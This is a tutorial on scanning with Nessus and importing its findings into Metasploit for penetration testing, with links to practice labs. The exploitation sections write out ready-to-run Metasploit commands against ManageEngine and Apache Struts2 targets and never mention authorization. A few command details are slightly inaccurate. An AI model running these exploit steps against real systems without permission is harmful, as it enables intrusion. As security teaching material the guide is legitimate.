# Vulnerability Scanning with Nessus: Installation, Configuration & Integration with Metasploit

## Overview

Nessus is a proprietary vulnerability scanner developed by Tenable that automates the process of identifying security vulnerabilities in target systems. This guide covers installing Nessus Essentials (free version), performing vulnerability scans, and integrating results with Metasploit for exploitation.

## Key Concepts

### How Nessus Works

1. **Host Discovery**: Identifies active hosts on the network
2. **Port Scanning**: Discovers open ports and services
3. **Service Enumeration**: Gathers banner and version information
4. **Vulnerability Matching**: Cross-references services with vulnerability database
5. **Reporting**: Provides CVEs, risk scores, and exploit availability information

### Benefits

- Automates vulnerability identification
- Provides CVE codes for research
- Integrates with Metasploit framework
- Scans up to 16 IP addresses (Nessus Essentials)

## Installation on Kali Linux

### Download Process

1. Visit [Tenable Nessus Essentials](https://www.tenable.com/products/nessus)
2. Complete registration form for activation code
3. Download the Kali Linux Debian package

### Installation Commands

```bash
# Navigate to downloads directory
cd ~/Downloads

# Make package executable
chmod +x Nessus-*.deb

# Install using dpkg
sudo dpkg -i Nessus-*.deb

# Start Nessus service
sudo systemctl start nessusd.service

# Verify service status
sudo systemctl status nessusd.service
```

### Initial Setup

1. Access Nessus web interface: `https://localhost:8834`
2. Accept SSL certificate warning
3. Select "Nessus Essentials"
4. Enter activation code from email
5. Create admin credentials
6. Wait for plugin compilation (15-30 minutes)

## Performing Vulnerability Scans

### Creating a Basic Scan

1. Click "New Scan" → "Basic Network Scan"
2. Configure scan settings:
   - **Name**: Descriptive scan name
   - **Targets**: IP addresses or ranges
   - **Schedule**: On-demand for manual execution

### Scan Configuration Options

- **Discovery**: Host discovery methods (TCP, ARP, ICMP)
- **Port Scanning**: Common ports, all ports, or custom ranges
- **Assessment**: Vulnerability check types and intensity
- **Performance**: Scan speed and resource usage

### Launching Scans

```bash
# From terminal (alternative method)
sudo /opt/nessus/sbin/nessuscli scan status
```

## Analyzing Results

### Vulnerability Filtering

- **By Severity**: Critical, High, Medium, Low
- **By Exploit Availability**: Metasploit modules
- **By Service**: Specific ports or applications
- **By CVSS Score**: Vulnerability impact rating

### Key Information Provided

- CVE codes for research
- CVSS vulnerability scores (0-10 scale)
- Exploit availability indicators
- Remediation recommendations
- Affected service versions

## Integration with Metasploit

### Exporting Nessus Results

1. Navigate to scan results
2. Click "Export" → "Nessus" format
3. Save XML file for import

### Importing into Metasploit

```bash
# Start Metasploit with database
msfconsole

# Create dedicated workspace
workspace -a nessus_scan

# Import Nessus results
db_import /path/to/nessus_scan.xml

# Verify imported data
hosts
services
```

### Vulnerability Analysis in Metasploit

```bash
# List all vulnerabilities
vulns

# Filter by specific port
vulns -p 445

# Search for exploit modules using CVE
search cve:2017 type:exploit name:smb

# Search using Microsoft vulnerability ID
search MS17-010
```

## Practical Lab Environment

### TryHackMe: Metasploit Introduction

- **Lab URL**: [Metasploit: Introduction](https://tryhackme.com/room/metasploitintro)
- **Access**: Free account required
- **Description**: Practice vulnerability scanning and exploitation in a controlled environment

### PortSwigger Web Security Academy

- **Lab URL**: [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- **Access**: Completely free
- **Description**: Web application vulnerability scanning practice

## Advanced Usage Examples

### Dynamic Target Scanning

```bash
# Script to scan multiple targets from file
#!/bin/bash
TARGET_FILE="targets.txt"
SCAN_NAME="dynamic_scan_$(date +%Y%m%d_%H%M%S)"

while IFS= read -r target; do
    echo "Scanning target: $target"
    # Nessus API calls or CLI commands would go here
done < "$TARGET_FILE"
```

### Automated Scan and Import Pipeline

```bash
#!/bin/bash
# Example automation script structure
TARGET=$1
SCAN_NAME="auto_scan_$TARGET"

# 1. Create and run Nessus scan (pseudo-code)
# nessus_scan_create --name "$SCAN_NAME" --targets "$TARGET"
# nessus_scan_launch --name "$SCAN_NAME"

# 2. Wait for completion, then export
# nessus_scan_export --name "$SCAN_NAME" --format xml

# 3. Import to Metasploit
msfconsole -x "workspace -a $SCAN_NAME; db_import ${SCAN_NAME}.xml; exit"

echo "Scan completed and imported for target: $TARGET"
```

### Metasploit Exploitation Workflow

```bash
# After importing Nessus results
msfconsole

# Set workspace
workspace nessus_scan

# Identify high-value targets
vulns -S "critical OR high"

# Search for specific exploit
search cve:2021 type:exploit

# Use identified exploit
use exploit/windows/http/manageengine_desktop_central
set RHOSTS <target_ip>
set RPORT 8383
exploit
```

## Real-World Usage Example

### Scenario: Web Application Assessment

```bash
# 1. Perform Nessus scan on web server
# Targets: 192.168.1.100
# Scan type: Web application focused

# 2. Export and import results
db_import web_scan_nessus.xml

# 3. Analyze web-specific vulnerabilities
vulns -p 80,443,8080

# 4. Identify exploitable vulnerabilities
search cve:2023 type:exploit name:apache

# 5. Launch targeted exploitation
use exploit/multi/http/apache_struts2_code_exec
set RHOSTS 192.168.1.100
set TARGETURI /struts2-showcase/
exploit
```

## Best Practices

### Scan Configuration

- Schedule scans during maintenance windows
- Use appropriate scan intensity for environment
- Configure credentials for authenticated scanning when possible
- Regularly update Nessus plugins

### Result Management

- Export and archive scan results
- Use consistent naming conventions
- Maintain separate workspaces in Metasploit for different assessments
- Document false positives for future reference

### Integration Tips

- Always verify imported data with `hosts` and `services` commands
- Use specific filters to narrow down vulnerability lists
- Cross-reference Nessus findings with manual verification
- Leverage CVE codes for precise exploit module searches

## Troubleshooting

### Common Issues

- **Service not starting**: Verify system resources and permissions
- **Import failures**: Check XML file format and Metasploit database connection
- **Missing vulnerabilities**: Ensure plugin database is up to date
- **Performance problems**: Adjust scan settings and concurrent host limits

### Useful Commands

```bash
# Restart Nessus service
sudo systemctl restart nessusd.service

# Check Nessus logs
sudo tail -f /opt/nessus/var/nessus/logs/nessusd.messages

# Update Nessus plugins
sudo /opt/nessus/sbin/nessuscli update
```

This workflow demonstrates how automated vulnerability scanning with Nessus, combined with targeted exploitation through Metasploit, creates a powerful penetration testing methodology that efficiently identifies and validates security issues in target environments.
